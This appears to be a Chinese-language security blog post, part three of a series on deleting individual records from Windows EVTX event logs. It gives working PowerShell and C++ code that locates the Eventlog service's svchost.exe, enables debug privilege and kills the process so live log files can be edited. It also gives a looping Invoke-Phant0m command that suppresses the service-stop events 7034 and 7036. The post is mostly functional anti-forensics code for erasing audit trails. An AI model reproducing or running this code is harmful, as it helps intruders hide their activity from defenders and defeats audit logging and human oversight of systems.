---
layout: post
title: Windows XML Event Log (EVTX)单条日志清除（三）——通过解除文件占用删除当前系统单条日志记录
---


## 0x00 前言
---

Windows XML Event Log (EVTX)单条日志清除系列文章的第三篇，介绍第一种删除当前系统evtx日志文件单条日志记录的方法：关闭服务对应的进程，解除文件占用，删除日志，重启服务

## 0x01 简介
---

本文将要介绍以下内容：

- 通过c程序枚举服务信息，提取Eventlog服务对应进程svchost.exe的pid
- 通过c程序提权关闭Eventlog进程
- 通过c程序删除单条日志文件

## 0x02 删除思路
---

在上篇文章《Windows XML Event Log (EVTX)单条日志清除（二）——程序实现删除evtx文件的单条日志记录》介绍了删除单条日志记录的方法，但如果直接用来删除当前系统的日志，在打开文件时会报错，提示文件被占用

这是因为当前系统启动日志服务Eventlog后，会以独占模式打开日志文件，导致其他进程无法打开该日志文件，也就无法进行修改操作

有以下两种解决方法：

1. 结束日志服务Eventlog对应的进程，获得修改日志文件的权限

2. 获得日志服务Eventlog对应进程中指定日志文件的句柄，利用该句柄实现日志文件的修改


本文将要介绍第一种解决方法，分享在程序实现上的细节，最后开源实现代码

第二种解决方法会在之后的文章进行详细介绍

**注：**

通过关闭日志服务Eventlog线程的方法无法获得修改日志文件的权限


关闭日志服务Eventlog线程的powershell实现代码：

https://github.com/hlldz/Invoke-Phant0m

关闭日志服务Eventlog线程的c实现代码：

https://github.com/3gstudent/Windwos-EventLog-Bypass

介绍细节的分析文章：

[《利用API NtQueryInformationThread和I_QueryTagInformation实现对Windwos日志监控的绕过》](https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8API-NtQueryInformationThread%E5%92%8CI_QueryTagInformation%E5%AE%9E%E7%8E%B0%E5%AF%B9Windwos%E6%97%A5%E5%BF%97%E7%9B%91%E6%8E%A7%E7%9A%84%E7%BB%95%E8%BF%87/)

下面介绍第一种解决方法的程序实现


## 0x03 获得Eventlog服务对应进程svchost.exe的pid
---

由于Windows系统有多个svchost.exe进程，无法直接搜索进程名"svchost.exe"获得Eventlog服务对应的进程pid

查询思路：

枚举当前系统服务，根据服务名称筛选出对应的进程pid

### 1、通过powershell实现

代码如下：

```
Get-WmiObject -Class win32_service -Filter "name = 'eventlog'" | select -exp ProcessId
```

### 2、通过c++实现

```
#include <windows.h>
#pragma comment(lib,"Advapi32.lib") 
DWORD  getpid()
{
	DWORD PID = 0;
	SC_HANDLE scHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
	if (scHandle == NULL)
	{
		printf("[!]OpenSCManager fail(%ld)", GetLastError());
	}
	else
	{
		SC_ENUM_TYPE infoLevel = SC_ENUM_PROCESS_INFO;
		DWORD dwServiceType = SERVICE_WIN32;
		DWORD dwServiceState = SERVICE_STATE_ALL;
		LPBYTE lpServices = NULL;
		DWORD cbBufSize = 0;
		DWORD pcbBytesNeeded;
		DWORD servicesReturned;
		LPDWORD lpResumeHandle = NULL;
		LPCSTR pszGroupName = NULL;
		BOOL ret = EnumServicesStatusEx(scHandle, infoLevel, dwServiceType, dwServiceState, lpServices, cbBufSize, &pcbBytesNeeded, &servicesReturned, lpResumeHandle, pszGroupName);
		cbBufSize = pcbBytesNeeded;
		lpServices = new BYTE[cbBufSize];
		if (NULL == lpServices)
		{
			printf("[!]lpServices = new BYTE[%ld] -> fail(%ld)\n", cbBufSize, GetLastError());
		}
		else
		{
			ret = EnumServicesStatusEx(scHandle, infoLevel, dwServiceType, dwServiceState, lpServices, cbBufSize, &pcbBytesNeeded, &servicesReturned, lpResumeHandle, pszGroupName);
			LPENUM_SERVICE_STATUS_PROCESS lpServiceStatusProcess = (LPENUM_SERVICE_STATUS_PROCESS)lpServices;
			for (DWORD i = 0; i < servicesReturned; i++)
			{
				_strlwr_s(lpServiceStatusProcess[i].lpServiceName, strlen(lpServiceStatusProcess[i].lpServiceName) + 1);
				if (strstr(lpServiceStatusProcess[i].lpServiceName, "eventlog") != 0)
				{
					printf("[+]ServiceName:%s\n", lpServiceStatusProcess[i].lpServiceName);
					printf("[+]PID:%ld\n", lpServiceStatusProcess[i].ServiceStatusProcess.dwProcessId);
					PID = lpServiceStatusProcess[i].ServiceStatusProcess.dwProcessId;
				}
			}
			delete[] lpServices;
		}
		CloseServiceHandle(scHandle);
	}
	if (PID == 0)
		printf("[!]Get EventLog's PID error\n");

	return PID;
}

int main(int argc, char *argv[])
{
	DWORD pid = getpid();
	return 0;
}
```

## 0x04 提权关闭Eventlog进程
---

### 1、通过powershell实现

执行cmd命令taskkill即可

### 2、通过c++实现

c++的代码需要提升权限才能结束进程svchost.exe

```
#include <windows.h>

#pragma comment(lib,"Advapi32.lib") 

BOOL EnableDebugPrivilege(BOOL fEnable)
{
	BOOL fOk = FALSE;
	HANDLE hToken;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = fEnable ? SE_PRIVILEGE_ENABLED : 0;
		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
		fOk = (GetLastError() == ERROR_SUCCESS);
		CloseHandle(hToken);
	}
	return(fOk);
}

DWORD  getpid()
{
	DWORD PID = 0;
	SC_HANDLE scHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
	if (scHandle == NULL)
	{
		printf("[!]OpenSCManager fail(%ld)", GetLastError());
	}
	else
	{
		SC_ENUM_TYPE infoLevel = SC_ENUM_PROCESS_INFO;
		DWORD dwServiceType = SERVICE_WIN32;
		DWORD dwServiceState = SERVICE_STATE_ALL;
		LPBYTE lpServices = NULL;
		DWORD cbBufSize = 0;
		DWORD pcbBytesNeeded;
		DWORD servicesReturned;
		LPDWORD lpResumeHandle = NULL;
		LPCSTR pszGroupName = NULL;
		BOOL ret = EnumServicesStatusEx(scHandle, infoLevel, dwServiceType, dwServiceState, lpServices, cbBufSize, &pcbBytesNeeded, &servicesReturned, lpResumeHandle, pszGroupName);
		cbBufSize = pcbBytesNeeded;
		lpServices = new BYTE[cbBufSize];
		if (NULL == lpServices)
		{
			printf("[!]lpServices = new BYTE[%ld] -> fail(%ld)\n", cbBufSize, GetLastError());
		}
		else
		{
			ret = EnumServicesStatusEx(scHandle, infoLevel, dwServiceType, dwServiceState, lpServices, cbBufSize, &pcbBytesNeeded, &servicesReturned, lpResumeHandle, pszGroupName);
			LPENUM_SERVICE_STATUS_PROCESS lpServiceStatusProcess = (LPENUM_SERVICE_STATUS_PROCESS)lpServices;
			for (DWORD i = 0; i < servicesReturned; i++)
			{
				_strlwr_s(lpServiceStatusProcess[i].lpServiceName, strlen(lpServiceStatusProcess[i].lpServiceName) + 1);
				if (strstr(lpServiceStatusProcess[i].lpServiceName, "eventlog") != 0)
				{
					printf("[+]ServiceName:%s\n", lpServiceStatusProcess[i].lpServiceName);
					printf("[+]PID:%ld\n", lpServiceStatusProcess[i].ServiceStatusProcess.dwProcessId);
					PID = lpServiceStatusProcess[i].ServiceStatusProcess.dwProcessId;
				}
			}
			delete[] lpServices;
		}
		CloseServiceHandle(scHandle);
	}

	return PID;
}

int main(int argc, char *argv[])
{

	DWORD pid = getpid();
	if (pid == 0)
	{
		printf("[!]Get EventLog's PID error\n");
		return -1;
	}

	printf("[+]Try to EnableDebugPrivilege... ");
	if (!EnableDebugPrivilege(TRUE))
	{
		printf("[!]AdjustTokenPrivileges Failed.<%d>\n", GetLastError());
		return -1;
	}
	printf("Done\n");

	printf("[+]Try to OpenProcess... ");
	HANDLE processHandle = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
	if (processHandle == NULL)
	{
		printf("Error\n");
		return -1;
	}
	printf("Done\n");

	printf("[+]Try to TerminateProcess... ");
	BOOL bResult = TerminateProcess(processHandle, 0);
	if (bResult == NULL)
	{
		printf("[!]Error\n");
		return -1;
	}
	printf("Done\n");

	return 0;
}
```

**注：**

结束Eventlog服务对应的进程后，隔一段时间后Eventlog服务会自动重启

## 0x05 修改日志文件，删除日志记录
---

结束Eventlog服务对应的进程后，获得了操作日志文件的权限，修改日志文件的方法和c代码可参考上一篇文章《Windows XML Event Log (EVTX)单条日志清除（二）——程序实现删除evtx文件的单条日志记录》

代码参考地址：

https://github.com/3gstudent/Eventlogedit-evtx--Evolution/blob/master/DeleteRecordbyTerminateProcess.cpp

代码实现了自动获得日志服务的进程，结束进程，修改指定的系统日志文件，修改成功后重新启动日志服务


## 0x06 其他细节
---

关闭Eventlog进程和重启服务Eventlog会产生日志文件，位于system.evtx下，EventID为`7034`和`7036`

为了避免产生日志7034和7036，可通过关闭日志服务Eventlog线程的方法关闭日志记录功能

这里需要添加代码，写一个循环，在日志服务重启后立即结束线程，使得日志记录功能失效

参考powershell实现代码：

https://github.com/hlldz/Invoke-Phant0m

添加如下代码：

```
for($a=1;$a>0;$a=1)
{
    Invoke-Phant0m
    Start-Sleep -Seconds 1
}
```

## 0x07 小结
---

本文介绍了通过关闭服务对应的进程，解除文件占用，删除当前系统单条日志记录的方法，在应用方面不太适合服务器的日志删除(停掉服务影响整个系统的正常使用)，下一篇文章将要介绍通过日志文件句柄删除当前系统单条日志记录的方法，优点是不需要重启服务，不影响服务器的正常使用


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)





